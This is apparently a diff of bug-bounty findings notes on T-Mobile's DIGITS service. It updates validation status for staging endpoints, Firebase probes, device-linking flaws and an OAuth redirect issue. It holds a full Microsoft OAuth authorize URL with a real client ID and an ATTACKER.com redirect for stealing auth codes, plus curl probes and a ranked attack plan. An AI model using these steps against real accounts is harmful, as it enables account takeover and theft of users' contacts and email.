@@ -5,28 +5,9 @@
 
 ---
 
-## 1. Internal/Staging DIGITS API Endpoints in Production JS
+## ~~1. Internal/Staging DIGITS API Endpoints~~ — DEAD (Validated 2026-10-16)
 
-**Severity:** Critical (CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — 9.1)
-**Class:** CWE-200 — Exposure of Sensitive Information
-**Target:** `digits.t-mobile.com/static/js/main.js`
-
-### Summary
-Production DIGITS bundle hardcodes 3 internal/staging API base URLs and 1 production CPaaS endpoint. Staging environments typically run with weaker auth, debug mode, or no WAF.
-
-### Endpoints
-| URL | Env |
-|-----|-----|
-| `https://api-dev.lab.t-mobile.com/v1/digitsApi` | Internal lab |
-| `https://api-devstg.t-mobile.com/v1/digitsApi` | Dev staging |
-| `https://api-teststg.t-mobile.com/v1/digitsApi` | Test staging |
-| `https://cpaas-geo.t-mobile.com/v1/digitsApi` | Production CPaaS |
-
-### What to test
-- Direct unauthenticated requests to staging endpoints
-- Compare auth enforcement staging vs production
-- Verbose error messages / stack traces on staging
-- MSISDN manipulation on staging without rate limits
+**Status:** All 3 staging endpoints timeout (internal-only, not internet-reachable). Production CPaaS returns 403 via Akamai WAF. Not exploitable from external.
 
 ---
 
@@ -57,26 +38,13 @@ The `msisdn` param is passed directly from client-side state.
 
 ---
 
-## 3. Firebase RTDB — Potential Unauthenticated Data Access
+## ~~3. Firebase RTDB~~ — DEAD (Validated 2026-10-16)
 
-**Severity:** High (CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — 7.5)
-**Class:** CWE-306 — Missing Authentication for Critical Function
-**Target:** `phone-2-1247.firebaseio.com`
-
-### Summary
-DIGITS uses Firebase project `phone-2-1247`. The Realtime Database URL is exposed. If security rules allow unauthenticated reads, call logs, messages, and phone numbers are exposed.
-
-### What to test
-```
-curl https://phone-2-1247.firebaseio.com/.json
-curl https://phone-2-1247.firebaseio.com/users.json
-curl https://phone-2-1247.firebaseio.com/messages.json
-```
-Also test Firebase Storage: `phone-2-1247.appspot.com`
+**Status:** Database deactivated (HTTP 423). Firestore returns 404. Storage bucket 404. Project decommissioned.
 
 ---
 
-## 4. MSISDN Registration Flow — Carrier Auth Bypass Vector
+## 3. MSISDN Registration Flow — Carrier Auth Bypass Vector
 
 **Severity:** Critical (Special Target — Carrier Auth Bypass)
 **Class:** CWE-287 — Improper Authentication
@@ -103,7 +71,7 @@ The JS exposes the complete MSISDN-to-device registration flow. Key parameters (
 
 ---
 
-## 5. Device Unlinking Without Ownership Verification
+## 4 (was 5). Device Unlinking Without Ownership Verification
 
 **Severity:** High (CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H — 8.1)
 **Class:** CWE-862 — Missing Authorization
@@ -119,36 +87,49 @@ The unlink endpoint may allow removing another user's device from their DIGITS l
 
 ---
 
-## 6. OAuth Open Redirect / Token Theft
+## 4. OAuth Token Theft — Microsoft redirect_uri (Needs Browser Validation)
 
 **Severity:** High (CVSS 3.1: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N — 7.4)
 **Class:** CWE-601 — URL Redirection to Untrusted Site
-**Target:** DIGITS Google/Microsoft OAuth flows
+**Target:** DIGITS Microsoft OAuth flow
+**Status:** Suspected — needs browser-based validation
 
 ### Summary
-DIGITS integrates Google OAuth (`contacts.readonly`, `userinfo.email`) and Microsoft OAuth. If the redirect_uri is not strictly validated, you can steal OAuth tokens.
+DIGITS Microsoft OAuth (client_id `1fad2d37-c0ad-4eb6-9ead-9b4f8429f3fb`) renders a full login page when an arbitrary `redirect_uri` (e.g. `https://evil.com/callback`) is supplied. Azure AD shows no error at the authorization endpoint. If redirect_uri is also not validated at the consent/redirect step, the auth code is sent to the attacker's domain.
 
-### Endpoints
-- `accounts.google.com/o/oauth2/v2/auth` → redirect_uri manipulation
-- `login.microsoftonline.com/common/oauth2/v2.0/authorize` → redirect_uri manipulation
+### Validated Results
+| Provider | Client ID | redirect_uri=evil.com | Verdict |
+|----------|-----------|----------------------|---------|
+| **Google** | `791229224196-mag7...` | `redirect_uri_mismatch` error (HTTP 302) | **PROTECTED** — strict validation |
+| **Microsoft** | `1fad2d37-c0ad-4eb6...` | Login page renders (HTTP 200) with evil.com embedded | **NEEDS BROWSER TEST** |
 
-### What to test
-- Change `redirect_uri` to attacker-controlled domain
-- Use `/../` path traversal in redirect_uri
-- Open redirect chains via T-Mobile subdomains as stepping stones
+### OAuth Config from JS
+- Google legit redirect: `{dassRootUrl}/digitslink/glink`
+- Microsoft legit redirect: `{daasRootUrl}/digitslink/mlink`
+- Google scopes: `contacts.readonly`, `userinfo.email`
+- Microsoft scopes: `Contacts.Read`, `Calendars.Read`, `offline_access`, `User.Read`, `openid`, `email`
+
+### What to test next (browser required)
+1. Open in browser: `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=1fad2d37-c0ad-4eb6-9ead-9b4f8429f3fb&redirect_uri=https://ATTACKER.com/callback&response_type=code&scope=Contacts.Read%20Calendars.Read%20offline_access%20User.Read%20openid%20email`
+2. Sign in with any Microsoft account
+3. If redirected to `ATTACKER.com/callback?code=AUTH_CODE` → **P2 confirmed** (OAuth token theft)
+4. If `AADSTS50011` error → redirect_uri is validated server-side (not exploitable)
+
+### Impact if confirmed
+Attacker steals Microsoft OAuth code → exchanges for access token → reads victim's Contacts, Calendars, and email via Microsoft Graph API. Combined with DIGITS account linking, could enumerate linked devices.
 
 ---
 
-## PRIORITY ATTACK PLAN
+## PRIORITY ATTACK PLAN (Updated after validation)
 
-| # | Target | Bug Class | Payout Tier |
-|---|--------|-----------|-------------|
-| 1 | DAAS IDOR (`/daas/lines/deviceInstances` + MSISDN swap) | P1 — Account Takeover | Core DIGITS |
-| 2 | MSISDN registration bypass (register victim's line to your device) | P1 — Carrier Auth Bypass | **Special Target** |
-| 3 | Device unlink without auth (`/digitslink/api/unlink`) | P1 — Account Manipulation | Core DIGITS |
-| 4 | Firebase RTDB unauthenticated read | P1/P2 — Data Exposure | Wildcard |
-| 5 | Staging API access (no auth / debug mode) | P2 — Internal Access | Wildcard |
-| 6 | OAuth redirect_uri bypass → token theft | P2 — Account Takeover | Core DIGITS |
+| # | Target | Bug Class | Status |
+|---|--------|-----------|--------|
+| 1 | DAAS IDOR (`/daas/lines/deviceInstances` + MSISDN swap) | P1 — Account Takeover | **Needs SIM** |
+| 2 | MSISDN registration bypass (register victim's line) | P1 — Carrier Auth Bypass (Special Target) | **Needs SIM** |
+| 3 | Device unlink without auth (`/digitslink/api/unlink`) | P1 — Account Manipulation | **Needs SIM** |
+| 4 | Microsoft OAuth redirect_uri bypass → token theft | P2 — Account Takeover | **Needs browser test** |
+| ~~5~~ | ~~Staging API access~~ | ~~P2~~ | **DEAD** — internal only |
+| ~~6~~ | ~~Firebase RTDB~~ | ~~P1/P2~~ | **DEAD** — deactivated |
 
 ---
 
